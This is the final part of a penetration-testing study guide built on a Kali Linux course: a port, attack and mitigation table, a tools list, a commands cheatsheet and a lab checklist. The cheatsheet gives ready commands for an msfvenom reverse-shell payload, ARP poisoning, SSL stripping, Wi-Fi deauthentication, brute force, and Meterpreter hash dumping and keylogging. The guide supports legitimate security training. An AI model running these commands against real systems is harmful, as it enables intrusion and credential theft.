SMTP      25     Open relay, enumeration   SPF, DKIM, DMARC
DNS       53     Poisoning, amplification  DNSSEC, rate limit
HTTP      80     XSS, SQLi, LFI, RFI      WAF, input validation
Kerberos  88     Golden ticket, AS-REP     Patch, monitoring
POP3      110    Sniffing, brute force     Use POP3S (995)
NetBIOS   139    Enumeration, relay        Disable if not needed
IMAP      143    Sniffing, brute force     Use IMAPS (993)
SNMP      161    Enumeration, community    SNMPv3 with auth
HTTPS     443    SSL stripping, MITM       HSTS, valid cert
SMB       445    EternalBlue, relay        Patch, disable SMBv1
LDAP      389    Injection, enumeration    LDAPS, access control
RDP       3389   Brute force, BlueKeep     NLA, patch, firewall
MySQL     3306   Brute force, SQLi         Firewall, strong auth
RPC       135    DCOM exploits             Firewall
```

### 20.8 Security Tools Quick Reference

```
Category              Tool              Purpose
──────────────────────────────────────────────────────────
Reconnaissance        Nmap              Port scanning
                      Masscan           Fast port scanning
                      theHarvester      Email/subdomain OSINT
                      Shodan            Internet-wide device search
                      Maltego           Visual OSINT mapping

Web Testing           Burp Suite        Web proxy and testing
                      sqlmap            SQL injection
                      nikto             Web server scanning
                      gobuster/dirb     Directory brute force
                      wpscan            WordPress scanning
                      OWASP ZAP         Web app scanner (free alternative)

Exploitation          Metasploit        Exploit framework
                      SearchSploit      Local exploit search
                      ExploitDB         Online exploit database
                      BeEF              Browser exploitation

Password Attacks      Hashcat           GPU hash cracking
                      John              CPU hash cracking
                      Hydra             Online brute force
                      CrackMapExec      Post-exploitation + brute force

Network               Wireshark         Packet analysis
                      tcpdump           CLI packet capture
                      Ettercap          MITM attacks
                      Responder         NTLMv2 hash capture

Wireless              Aircrack-ng       WEP/WPA cracking
                      Reaver            WPS PIN attack
                      Kismet            Wireless monitoring

Forensics             Autopsy           GUI forensics
                      Volatility        Memory forensics
                      Foremost          File carving

Reporting             Dradis            Collaborative reporting
                      Faraday           Pentest IDE
                      Serpico           Report generation
```

---

## Appendix A: Critical Commands Cheatsheet

```bash
# === RECONNAISSANCE ===
nmap -sV -sC -O -T4 TARGET                    # service/OS detection
nmap -sS -p- -T4 TARGET                       # all ports stealth scan
whois TARGET_DOMAIN                            # domain registration info
dnsenum TARGET_DOMAIN                          # full DNS enum
dnsrecon -d TARGET_DOMAIN                     # DNS records
theharvester -d TARGET_DOMAIN -b all          # OSINT gathering
wafw00f https://TARGET_DOMAIN                 # WAF detection

# === WEB TESTING ===
nikto -host http://TARGET                     # web server scan
gobuster dir -u http://TARGET -w wordlist.txt # directory bruteforce
sqlmap -u "http://TARGET?id=1" --dbs         # SQL injection
wpscan --url http://TARGET -e u,vp           # WordPress scan
curl -I http://TARGET | grep -i security     # check security headers

# === EXPLOITATION ===
msfconsole                                    # launch Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# === PASSWORD CRACKING ===
hashcat -m 0 -a 0 hashes.txt rockyou.txt    # MD5 dictionary
john --wordlist=rockyou.txt shadow.txt       # shadow file
hydra -l admin -P passwords.txt TARGET ssh  # SSH brute force

# === NETWORK ===
tcpdump -i eth0 -n -w capture.pcap          # packet capture
arpspoof -i eth0 -t VICTIM GATEWAY          # ARP poison
echo 1 > /proc/sys/net/ipv4/ip_forward     # enable forwarding
sslstrip -l 8080                            # SSL stripping

# === WIRELESS ===
airmon-ng start wlan0                        # monitor mode
airodump-ng wlan0mon                        # scan networks
aireplay-ng -0 5 -a BSSID wlan0mon         # deauth clients
aircrack-ng -w rockyou.txt capture.cap     # crack handshake

# === POST-EXPLOITATION ===
# In Meterpreter:
getsystem                                   # privilege escalation
hashdump                                    # dump password hashes
screenshot                                  # take screenshot
keyscan_start; keyscan_dump               # keylogger
upload shell.php /var/www/html/            # upload file
portfwd add -l 8080 -p 80 -r INTERNAL_IP  # port forward

# === FORENSICS ===
foremost -t all -i disk.dd -o /tmp/recovered/  # file carving
strings suspicious.exe | grep -i pass          # extract strings
file suspicious.bin                             # identify file type
md5sum disk.dd                                  # verify integrity
```

---

## Appendix B: Lab Practice Checklist

```
Week 1 — Foundation
□ Kali Linux setup in VMware
□ Metasploitable 2 deployed, host-only network
□ All Linux commands in Section 2 practiced
□ Wireshark installed, captured HTTP traffic
□ First Nmap scan completed against Metasploitable 2

Week 2 — Reconnaissance
□ WHOIS lookup on your own domain
□ DNS enumeration: dnsrecon, dnsenum, dig
□ Zone transfer attempted (check if your test server allows it)
□ Subdomain discovery with Subbrute or Knock
□ SSL analysis with SSLyze on a test HTTPS server
□ Nmap scripting engine: run vulnerability scripts against Metasploitable 2

Week 3 — Web Application
□ DVWA set to Low security, tested all modules
□ SQLi: manual injection then sqlmap on DVWA
□ XSS: reflected and stored on DVWA
□ Command injection on DVWA
□ Burp Suite: intercepted and modified a request
□ Nikto scan against DVWA
□ DirBuster/Gobuster against your test web server
□ SQLi on your own PHP test application

Week 4 — Exploitation
□ Searched for Metasploitable 2 exploits in SearchSploit
□ Exploited vsftpd backdoor via Metasploit
□ Exploited Samba usermap_script
□ Created reverse shell payload with MSFVenom
□ Obtained Meterpreter session, ran post modules

Week 5 — Password Attacks
□ Created custom wordlist with Crunch
□ Ran Hydra against SSH on Metasploitable 2
□ Ran John against Linux shadow file
□ Used Hashcat to crack MD5 hashes
□ Dumped and cracked hashes from Metasploitable 2

Week 6 — Advanced
□ ARP poisoning in lab + captured HTTP passwords
□ SSL strip in lab environment
□ WPA2 handshake capture + cracking (your own network)
□ Social Engineering Toolkit: website clone
□ Full penetration test against Metasploitable 2 with report
```

---

_Document version: 1.0 | Based on Kali Linux course curriculum_
_For academic study and authorized penetration testing only_
